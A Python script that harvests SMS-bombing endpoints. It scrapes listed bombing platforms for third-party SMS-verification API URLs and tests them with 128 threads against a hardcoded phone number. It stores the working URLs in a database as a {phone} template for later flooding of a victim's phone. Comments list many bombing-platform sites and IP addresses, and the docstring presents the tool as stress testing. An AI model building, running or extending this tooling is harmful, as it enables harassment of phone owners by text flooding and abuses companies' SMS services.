#!/usr/bin/python python3
# coding=utf-8
'''
Author: whalefall
Date: 2021-08-07 14:15:50
LastEditTime: 2021-08-30 12:01:20
Description: 短信测压接口测试平台,测试200状态码的接口,不一定可用
'''
import threading
import queue
from utils.db_sqlite import Sql
import re
import requests
import urllib3
urllib3.disable_warnings()


class SMS(object):
    # 默认的请求密钥
    default_phone = "15019682928"
    key_default = f"?hm={default_phone}&ok="

    def __init__(self, website, key=key_default) -> None:
        self.url = website
        self.header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
        }
        self.key = key
        self.api_queue = queue.Queue()
        self.db = Sql()
        self.lock = threading.Lock()

    def get_sms_api(self):
        '''请求短信轰炸平台'''
        with requests.session() as ses:
            ses.get(self.url, headers=self.header,verify=False)
            resp = ses.get(f"{self.url}{self.key}", headers=self.header)
        # print(resp.text)
        pat = re.compile(r"<img src='(.*?)' alt=''/>")
        apis = pat.findall(resp.text)
        assert not apis == [], "未找到任何接口!"
        print("获取到的原始接口总数:%s" % (len(apis)))
        # 需要进行预处理

        for api in apis:
            # if ("https://" or "http://") not in api:
            #     continue
            # 排除接口中没有电话号码的网址

            if SMS.default_phone not in api:
                continue
            # 网址处理
            api = api.strip().replace(" ", "").replace(
                SMS.default_phone, "{phone}")
            # print(api)
            self.api_queue.put(api)
        print("Put到队列的接口总数:%s" % (self.api_queue.qsize()))

    def check_theads(self):
        '''多线程检查可用性'''
        while True:
            if self.api_queue.empty():
                print(f"线程{threading.current_thread().name}结束")
                break
            api = self.api_queue.get()

            try:
                with requests.get(api.replace("{phone}", SMS.default_phone), headers=self.header, timeout=20, verify=False) as resp:
                    if resp.status_code == 200:
                        print(f'线程{threading.current_thread().name}:[SUC]校验成功!队列数:{str(self.api_queue.qsize())}')
                        with self.lock:
                            # 多线程写sqlite数据库要加锁
                            r = self.db.update(api)
                            if r:
                                print(
                                    f"线程{threading.current_thread().name}:已添加{api} 队列数:{str(self.api_queue.qsize())}")
            except Exception as e:
                print(
                    f"线程{threading.current_thread().name}出错 队列数:{str(self.api_queue.qsize())}")
                pass
            finally:
                self.api_queue.task_done()

    def main(self):
        self.get_sms_api()
        # 在此设置线程数 int 类型
        threads_count = 128
        threads = [
            threading.Thread(target=self.check_theads, name=f"Theads-{i}")
            for i in range(1, threads_count+1)
        ]
        for thread in threads:
            thread.start()


if __name__ == '__main__':
    # 轰炸平台
    # http://www.sss.pet/
    # http://qazwd.top
    # http://www.yxdhma.cn
    # http://hz.7qi.me/index.php?0pcall={SMS.default_phone}&ok=
    # http://hzz.yunceng.top/index.php
    # https://97sq.com/dx/index.php
    # https://y06.top/index.php
    # http://8.210.210.197:5678/index.php
    # https://120.77.244.209/sdlz/yh.php
    # http://103.116.46.190/index.php?
    # http://120.26.174.82:85/index.php?
    # http://2hz.xyz/index.php?dnm=15019872239&ok=
    # http://42.193.114.190:1234/index.php?
    # http://47.119.139.230/index.php
    # https://hz.79g.cn/index.php?

    # 实例: http://hz.7qi.me/index.php?0pcall={SMS.default_phone}&ok=
    # https://hz.79g.cn/index.php?0pcall=15019682928&ok=
    url = "https://hz.79g.cn/index.php"
    # 0pcall=15019682928&c=1 需要加f格式化字符串！！
    spider = SMS(url, key=f'?0pcall={SMS.default_phone}&ok=')
    # url = 'https://120.77.244.209/sdlz/yh.php'
    # spider = SMS(url)
    spider.main()
